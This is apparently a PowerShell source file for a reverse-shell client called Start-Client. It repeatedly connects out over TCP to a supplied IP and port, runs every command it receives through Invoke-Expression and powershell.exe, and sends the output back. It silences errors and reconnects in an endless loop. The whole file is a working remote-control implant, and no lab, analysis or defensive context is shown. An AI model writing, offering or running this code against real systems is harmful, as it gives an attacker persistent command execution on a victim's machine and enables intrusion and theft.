function Start-Client {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ip,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [int64]
        $port = 9000
    )
    
    function Get-OutCommand {
        param (
            [Parameter(Position=0, Mandatory=$true)][ValidateNotNullOrEmpty()][string]$command,
            [Parameter(Position=2, Mandatory=$true)][ValidateNotNullOrEmpty()][string]$time
        )
        $b = Invoke-Expression("{powershell.exe -noninteractive -c '"+$command+" 2>&1' | Out-String}")
        $j = Start-Job -ScriptBlock $b 
        Wait-Job -Job $j -Timeout $time | Out-Null
        $msg = ""
        if ($j.JobStateInfo.State -ne "Completed") {$msg = "Process Has exceeded Timeout Limit and was forcefully stopped. Output as follows:"}
        $j.StopJob()
        $r = Receive-Job $j
        $o = ($msg + $r) | Out-String
        $j.Dispose()
        return $o
    }   

    while ($true) {

        do{
            try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
            catch { Start-Sleep 1 }
        } while (-not $client.Connected)
        $stream = $client.GetStream()
        Start-Sleep 1

        $ErrorActionPreference = "SilentlyContinue"

        $t = New-Object byte[] 2048
        $stream.Read($t, 0, $t.Length) | Out-Null
        0..([int64]($t.Length)-1) | ForEach-Object {if ($t[$_] -ne 0){$to+=[text.encoding]::ASCII.GetString($t[$_])}}
        $to = [int64]$to

        while ($client.Connected) {
            $l = New-Object byte[] 2048
            $stream.Read($l, 0, $l.Length) | Out-Null
            0..([int64]($l.Length)-1) | ForEach-Object {if ($l[$_] -ne 0){$s+=[text.encoding]::ASCII.GetString($l[$_])}}
            $c = New-Object byte[] ([int64]$s)
            $stream.Read($c, 0, $c.Length) | Out-Null
            $op = Get-OutCommand -command ([Text.Encoding]::Unicode.GetString($c)) -time $to | Out-String
            if (!$op) {$op="Expression Error. No Output Recieved."}
            $o = [Text.Encoding]::Unicode.GetBytes($op)
            $l = [Text.Encoding]::ASCII.GetBytes([String]$o.Length)
            $pad = New-Object byte[] (2048-$l.Length)
            $w = $l + $pad
            $stream.Write($w, 0, $w.Length) | Out-Null
            $stream.Write($o, 0, $o.Length) | Out-Null
            $l = $s = $c = $o = $pad = $w = $op = $null
            [GC]::Collect()
        }
    }
}